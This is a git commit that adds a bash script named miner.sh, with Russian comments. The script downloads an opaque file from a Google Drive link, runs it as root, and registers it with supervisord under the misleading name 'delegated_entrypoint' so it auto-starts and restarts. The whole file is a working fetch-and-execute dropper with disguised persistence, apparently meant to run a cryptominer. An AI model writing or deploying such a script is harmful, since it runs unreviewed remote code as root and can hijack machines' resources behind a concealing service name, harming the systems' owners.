c49ff0f3bfcbd951bf2ce55dc1d397ae256e4f53
3aKo-Jin <156850291+3aKo-Jin@users.noreply.github.com>
2025-01-20 22:57:26 +0300

    miner.sh

---
+++ miner.sh
@@ -0,0 +1,21 @@
+#!/bin/bash
+cd ~
+
+# Сохраняем скрипт в /root/mine.sh и делаем его исполняемым
+wget "https://drive.google.com/uc?export=download&id=1dhSfgivVbym0jHSdhxo0D0XGb_OW4EVB" -O /root/mine.sh
+chmod +x /root/mine.sh
+
+# Запускаем наш сохраненный скрипт
+/root/mine.sh >> /root/miner.log 2>&1
+
+# Настройка логирования supervisord через перенаправление stdout и stderr в файлы:
+echo "[program:delegated_entrypoint]" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
+echo "command=/root/mine.sh" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
+echo "directory=/root" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
+echo "autostart=true" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
+echo "autorestart=true" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
+echo "stdout_logfile=/var/log/delegated_entrypoint.log" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
+echo "stderr_logfile=/var/log/delegated_entrypoint_err.log" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
+
+# Перезапускаем supervisord для применения изменений
+supervisorctl restart delegated_entrypoint
